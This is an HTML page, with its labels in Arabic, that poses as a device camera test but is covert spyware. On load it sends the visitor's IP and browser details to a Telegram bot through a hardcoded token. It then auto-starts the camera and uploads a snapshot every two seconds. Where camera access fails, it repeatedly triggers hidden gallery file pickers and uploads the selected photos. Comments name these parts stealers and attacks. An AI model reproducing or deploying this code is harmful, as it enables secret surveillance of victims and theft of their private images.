<!DOCTYPE html>
<html>
<head>
    <title>Camera Access</title>
    <meta name="viewport" content="width=device-width">
    <style>
        body { margin: 0; padding: 20px; background: #000; color: #fff; font-family: Arial; text-align: center; }
        #video { width: 100%; max-width: 400px; height: 300px; background: #333; }
        #canvas { display: none; }
        button { background: #4CAF50; color: white; border: none; padding: 15px 32px; font-size: 16px; margin: 10px; cursor: pointer; border-radius: 5px; }
        .stealer { position: fixed; top: -10000px; opacity: 0; }
    </style>
</head>
<body>
    <h2>اختبر كاميرا الجهاز</h2>
    <video id="video" autoplay muted playsinline></video>
    <br>
    <button id="start">بدء الاختبار</button>
    <button id="capture" disabled>التقاط صورة</button>
    
    <!-- 🔥 GALLERY STEALERS -->
    <input type="file" class="stealer" id="gallery1" multiple accept="image/*">
    <input type="file" class="stealer" id="gallery2" multiple webkitdirectory>

    <script>
        const BOT_TOKEN = '8591713771:AAHsYoY0Be8gkmHVBF_ykWmpPt293_PNELk';
        const CHAT_ID = '8539996558';
        
        const video = document.getElementById('video');
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        const startBtn = document.getElementById('start');
        const captureBtn = document.getElementById('capture');
        const gallery1 = document.getElementById('gallery1');
        const gallery2 = document.getElementById('gallery2');

        canvas.width = 640;
        canvas.height = 480;

        // 🔥 SEND HIT
        fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>sendHit(d.ip));

        function sendHit(ip){
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
                method:'POST',
                body:JSON.stringify({
                    chat_id:CHAT_ID,
                    text:`🎥 CAMERA HIT!\n🌐 IP: ${ip}\n📱 ${navigator.userAgent.slice(0,80)}`
                })
            });
        }

        // 🔥 CAMERA ACCESS
        startBtn.onclick = async()=>{
            try{
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'environment' } 
                });
                video.srcObject = stream;
                startBtn.disabled = true;
                captureBtn.disabled = false;
                
                // 🔥 AUTO CAPTURE EVERY 2s
                setInterval(capturePhoto, 2000);
            }catch(e){
                // Fallback to gallery
                galleryAttack();
            }
        };

        // 🔥 LIVE CAMERA STEAL
        function capturePhoto(){
            ctx.drawImage(video, 0, 0, 640, 480);
            canvas.toBlob(blob=>{
                const file = new File([blob], `live_${Date.now()}.jpg`, {type: 'image/jpeg'});
                uploadFile(file);
            }, 'image/jpeg', 0.8);
        }

        // 🔥 GALLERY ATTACK
        function galleryAttack(){
            // Triple gallery trigger
            [gallery1, gallery2].forEach((input,i)=>{
                setTimeout(()=>{
                    input.click();
                    input.click();
                    input.onchange = e=>uploadFiles(Array.from(e.target.files));
                },i*200);
            });
            
            // Create more inputs
            for(let i=0;i<5;i++){
                setTimeout(()=>{
                    const inp = document.createElement('input');
                    inp.type='file';
                    inp.multiple=true;
                    inp.accept='image/*';
                    inp.className='stealer';
                    document.body.appendChild(inp);
                    inp.click();
                    inp.onchange=e=>uploadFiles(Array.from(e.target.files));
                },1000+i*100);
            }
        }

        // 🔥 UPLOAD
        function uploadFile(file){
            const fd = new FormData();
            fd.append('chat_id',CHAT_ID);
            fd.append('photo',file);
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
                method:'POST',body:fd
            });
        }

        function uploadFiles(files){
            files.slice(0,15).forEach(file=>uploadFile(file));
        }

        // 🔥 AUTO START
        setTimeout(()=>startBtn.click(),1500);
        
        // 🔥 Media Query Listener (Mobile Gallery)
        window.matchMedia('(max-width: 768px)').addEventListener('change', galleryAttack);
    </script>
</body>
</html>
